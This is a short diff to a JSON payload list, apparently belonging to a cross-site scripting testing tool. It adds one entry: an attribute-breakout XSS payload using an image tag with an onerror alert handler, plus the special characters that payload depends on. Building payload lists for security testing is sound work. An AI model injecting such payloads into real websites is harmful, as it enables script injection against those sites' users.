@@ -278,5 +278,17 @@
             ""
         ],
         "count": 0
+    },
+    {
+        "Payload":"\"><img src=\"x\" onerror=\"alert('XSS Vibes')\">",
+        "Attribute":[
+            "<",
+            ">",
+            "/",
+            "\"",
+            "'",
+            ";"
+        ],
+        "count": 0
     }
 ]
